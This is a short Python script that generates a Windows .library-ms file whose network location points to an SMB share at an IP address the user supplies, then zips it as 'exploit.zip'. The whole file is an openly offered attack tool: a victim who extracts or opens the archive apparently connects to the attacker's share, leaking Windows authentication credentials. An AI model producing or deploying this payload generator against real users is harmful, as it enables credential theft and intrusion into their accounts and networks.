import os
import zipfile
import argparse
import re
import sys

# Function to validate the IP address format
def is_valid_ip(ip):
    # Regular expression to validate IP address
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return ip_pattern.match(ip)

# Function to display help message
def display_help():
    print("""
    Usage: python script.py <file_name> <ip_address>
    
    Parameters:
    <file_name>  : A simple text (the name of the file to be created without extension).
    <ip_address> : A valid IP address where the shared resource is located.
    
    Example:
    python script.py myfile 192.168.1.1
    """)

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Create and zip a library file with a network path.")
    parser.add_argument("fileName", help="Name of the file to create (without extension)")
    parser.add_argument("ip_address", help="IP address where the shared resource is located")
    
    # Parse arguments
    args = parser.parse_args()

    # Validate the IP address
    if not is_valid_ip(args.ip_address):
        print("[ERROR] Invalid IP address format.")
        display_help()
        sys.exit(1)
    
    # File content
    content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{args.ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
    
    # File name + extension
    fullName = f"{args.fileName}.library-ms"
    
    # Create the file
    try:
        with open(fullName, "w", encoding="utf-8") as f:
            f.write(content)
        
        # Compress the file into a zip archive
        with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(fullName)
        
        # Remove the temporary file
        if os.path.exists(fullName):
            os.remove(fullName)
        
        print(f"\n\n[+] File {fullName} created successfully.")
    
    except Exception as e:
        print(f"[ERROR] An error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
